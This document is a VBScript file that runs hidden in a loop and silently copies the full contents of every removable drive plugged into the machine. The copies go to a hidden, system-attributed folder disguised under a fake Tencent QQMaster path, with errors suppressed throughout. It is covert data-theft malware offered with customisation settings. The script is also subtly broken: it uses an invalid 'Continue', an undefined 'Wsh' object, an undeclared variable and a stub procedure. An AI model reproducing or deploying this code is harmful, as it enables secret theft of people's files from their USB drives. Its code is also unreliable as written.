'Version 2.11 Ultimate
Option Explicit
On Error Resume Next

Dim Target, Container, DriveLetter, FileCheck, UDrive
Dim FlagFileNum, FlagFile, MaxCapacityGB, Pointer
Dim WScript, Fso, Fin
Set WScript = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")

'**********************************
' Customization Modification Part
'**********************************

FlagFileNum = 2
FlagFile = Array("Setup.exe", "bootmgr")

MaxCapacityGB = 32
Pointer = "D:\Program Files\Tencent\QQMaster\"

'*****************************************
' End of Customization Modification Part
'*****************************************

Dim IsCopied(23), i, k
For i = 0 to 22
  IsCopied(i) = False
Next

WScript.Run "CMD.EXE /C MD """ & Pointer & """", 0, False

Do
  Do
    Set Container = Fso.GetFolder(Pointer)
    Container.Attributes = 7
    Wsh.Sleep 1000
  Loop Until Container.Size <= MaxCapacityGB * 1000000000
  
  For i = 0 To 22
    DriveLetter = Chr(68 + i)
    IsHRV = False
    
    If Fso.DriveExists(DriveLetter) Then
      Set UDrive = Fso.GetDrive(DriveLetter)
      If UDrive.DriveType <> 1 Then Continue
      
      If Not IsCopied(i) Then
        FileCheck = True
        For k = 0 to FlagFileNum - 1
          If Fso.FileExists(DriveLetter & ":\" & FlagFile(k)) Then
            FileCheck = False
            Exit For
          End If
        Next
        
        If FileCheck Then
          Target = Pointer & Hex(UDrive.SerialNumber) & "\"
          Fso.CreateFolder Target
          Fso.CopyFile DriveLetter & ":\*", Target, True
          Fso.CopyFolder DriveLetter & ":\*", Target, True
          IsCopied(i) = True
        End If
      End If
    Else
      IsCopied(i) = False
    End If
  Next

Loop

Sub iHrvProc(Letter)
  For i = 0 To 22
    DriveLetter = Chr(68 + i)
  Next
End Sub



